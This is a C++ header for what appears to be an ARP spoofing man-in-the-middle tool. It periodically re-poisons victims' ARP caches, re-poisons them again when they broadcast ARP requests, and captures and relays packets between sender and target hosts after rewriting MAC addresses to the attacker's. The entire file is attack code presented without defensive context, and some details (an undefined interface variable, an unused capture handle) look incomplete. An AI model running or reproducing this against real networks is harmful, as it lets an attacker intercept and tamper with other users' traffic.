#pragma once
#include "pch.h"
#include "arphdr.h"
#include "ethhdr.h"

extern MacIp attacker;
extern vector<MacIpSendTarget> mac_ip_send_target;
extern void arp_attack();
extern bool thread_party_time;
extern uint64_t ip_send_target_num;

void* ptrhead_repeat_send(void* arg){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live((char*)arg, BUFSIZ, 1, 1, errbuf);
	while(thread_party_time){
        arp_attack();
		sleep(10);
	}
	pcap_close(pcap);
	return NULL;
}

void arp_send(pcap_t *pcap, EthHdr *eth, ArpHdr *arp, const u_char *packet, uint64_t packet_len){
    for (int i = 0; i < ip_send_target_num; i++) {
        if (mac_ip_send_target[i].sender_.mac_.compare(eth->smac_)) {
            eth->smac_ = attacker.mac_;
            eth->dmac_ = mac_ip_send_target[i].target_.mac_;
            arp->smac_ = attacker.mac_;
            arp->tmac_ = mac_ip_send_target[i].target_.mac_;
            pcap_sendpacket(pcap, packet, packet_len);
            break;
        }
        else if (mac_ip_send_target[i].target_.mac_.compare(eth->smac_)) {
            eth->smac_ = attacker.mac_;
            eth->dmac_ = mac_ip_send_target[i].sender_.mac_;
            arp->smac_ = attacker.mac_;
            arp->tmac_ = mac_ip_send_target[i].sender_.mac_;
            pcap_sendpacket(pcap, packet, packet_len);
            break;
        } 
    }
}

void ip_send(pcap_t *pcap, EthHdr *eth, const u_char *packet, uint64_t packet_len){
    for (int i = 0; i < ip_send_target_num; i++) {
        if (mac_ip_send_target[i].sender_.mac_.compare(eth->smac_)) {
            eth->smac_ = attacker.mac_;
            eth->dmac_ = mac_ip_send_target[i].target_.mac_;
            pcap_sendpacket(pcap, packet, packet_len);
            break;
        } 
        else if (mac_ip_send_target[i].target_.mac_.compare(eth->smac_)) {
            eth->smac_ = attacker.mac_;
            eth->dmac_ = mac_ip_send_target[i].sender_.mac_;
            pcap_sendpacket(pcap, packet, packet_len);
            break;
        } 
    }
}

void re_attack(pcap_t *pcap, EthHdr *eth, ArpHdr *arp, const u_char *packet, uint64_t packet_len){
     for (int i = 0; i < ip_send_target_num; i++) {
        if(!(mac_ip_send_target[i].sender_.mac_.compare(arp->tmac_))) continue;
        if(!(mac_ip_send_target[i].target_.mac_.compare(Mac("FF:FF:FF:FF:FF:FF"))))continue; 
        arp_attack();
        break;
    }
}

void relay(pcap_t *pcap, const u_char *packet, uint64_t packet_len) {
    u_char* relay_packet = new u_char[packet_len];
    memcpy(relay_packet, packet, packet_len);

    EthHdr* eth = (EthHdr *)relay_packet;
    if (ntohs(eth->type_) == eth_header::arp) {
        ArpHdr* arp = (ArpHdr *)(relay_packet + sizeof(EthHdr));
        arp_send(pcap, eth, arp, relay_packet, packet_len);
        re_attack(pcap, eth, arp, relay_packet, packet_len);
    } else if (ntohs(eth->type_) == eth_header::ip4) {
        ip_send(pcap, eth, relay_packet, packet_len);
    }
    delete[] relay_packet;
}

void *pthread_pcap_read(void* arg){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	while(thread_party_time){
		pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			continue;
		}
		relay(pcap, packet, header->caplen);
	}
	pcap_close(pcap);
	return NULL;
}